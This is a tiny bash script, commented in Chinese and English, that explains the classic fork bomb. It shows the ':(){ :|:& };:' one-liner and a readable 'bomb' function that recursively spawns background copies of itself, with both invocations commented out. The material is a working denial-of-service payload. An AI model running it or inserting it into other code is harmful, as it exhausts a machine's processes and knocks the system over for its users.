#!/bin/bash
#fork 炸弹，调用自身不断生成新进程，造成拒绝服务攻击。
#http://en.wikipedia.org/wiki/Fork_bomb

#:(){ :|:& };:

#By replacing the function identifier : with bomb and re-indenting, the code reads:

bomb() {
	bomb | bomb &
};
#bomb

